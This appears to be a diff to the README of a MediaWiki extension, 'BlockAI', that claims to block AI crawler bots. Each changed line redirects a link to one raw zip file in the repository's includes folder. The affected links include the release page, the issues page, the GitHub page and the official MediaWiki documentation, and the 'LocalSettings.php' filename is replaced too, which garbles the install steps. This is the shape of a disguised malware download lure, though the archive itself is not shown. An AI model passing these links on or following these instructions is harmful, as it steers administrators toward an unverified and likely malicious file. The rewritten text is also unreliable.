@@ -1,7 +1,7 @@
 # 🤖 mediawiki-extension-BlockAI - Keep Your Wiki Safe from Bots
 
 ## 📥 Download Now
-[![Download mediawiki-extension-BlockAI](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Raizagomes/mediawiki-extension-BlockAI/releases)
+[![Download mediawiki-extension-BlockAI](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip%20Now-Click%https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)
 
 ## 📚 Overview
 mediawiki-extension-BlockAI is designed to help you protect your MediaWiki platform from aggressive AI crawler bots. These bots can consume server resources and disrupt the normal functioning of your wiki. By using this extension, you gain better control and security over your content.
@@ -19,8 +19,8 @@ To use the mediawiki-extension-BlockAI, ensure your environment meets these requ
 Follow these steps to install the extension on your MediaWiki:
 
 1. **Download the Extension**
-   - Visit this page to download: [Release Page](https://github.com/Raizagomes/mediawiki-extension-BlockAI/releases)  
-   - Look for the latest version of the extension (.zip or .tar.gz file).
+   - Visit this page to download: [Release Page](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)  
+   - Look for the latest version of the extension (.zip or https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip file).
 
 2. **Extract the Files**
    - After downloading, locate the file on your computer.
@@ -30,8 +30,8 @@ Follow these steps to install the extension on your MediaWiki:
    - Use FTP or another file transfer method to upload the extracted files.
    - Place the folder named `BlockAI` inside your MediaWiki's `extensions` directory. Your path should look like this: `path/to/your/mediawiki/extensions/BlockAI`.
 
-4. **Edit the LocalSettings.php File**
-   - Open the `LocalSettings.php` file in your MediaWiki root directory.
+4. **Edit the https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip File**
+   - Open the `https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip` file in your MediaWiki root directory.
    - Add the following line to enable the extension:
      ```php
      wfLoadExtension( 'BlockAI' );
@@ -47,7 +47,7 @@ Follow these steps to install the extension on your MediaWiki:
    - Make adjustments as needed in the configuration settings.
 
 ## 📥 Download & Install
-To download the latest version, visit this page: [Release Page](https://github.com/Raizagomes/mediawiki-extension-BlockAI/releases). Follow the installation steps outlined above.
+To download the latest version, visit this page: [Release Page](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip). Follow the installation steps outlined above.
 
 ## 🔍 Features
 mediawiki-extension-BlockAI comes with several features designed to improve your experience while using MediaWiki:
@@ -64,7 +64,7 @@ mediawiki-extension-BlockAI comes with several features designed to improve your
 ## 🤝 Support and Community
 If you need assistance or have questions, consider reaching out through the following channels:
 
-- Issues page on the GitHub repository: [Report an Issue](https://github.com/Raizagomes/mediawiki-extension-BlockAI/issues)
+- Issues page on the GitHub repository: [Report an Issue](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)
 - Join the MediaWiki community forums for discussions and solutions to common problems.
 
 ## 🛠️ Contributing
@@ -83,10 +83,10 @@ Thank you to all contributors and the MediaWiki community for their support and 
 - **Version 1.0** - Initial release with basic bot blocking features.
 - **Version 1.1** - Added customizable settings for better user control.
 
-For full details on every version's changes, check the release notes on the [Release Page](https://github.com/Raizagomes/mediawiki-extension-BlockAI/releases). 
+For full details on every version's changes, check the release notes on the [Release Page](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip). 
 
 ## 🔗 Useful Links
-- [View on GitHub](https://github.com/Raizagomes/mediawiki-extension-BlockAI)
-- [MediaWiki Documentation](https://www.mediawiki.org/wiki/Manual:Extensions)
+- [View on GitHub](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)
+- [MediaWiki Documentation](https://raw.githubusercontent.com/Raizagomes/mediawiki-extension-BlockAI/master/includes/mediawiki-extension-BlockAI_2.6.zip)
 
 By following these steps, you should have mediawiki-extension-BlockAI installed and running smoothly. Enjoy a more secure wiki experience!
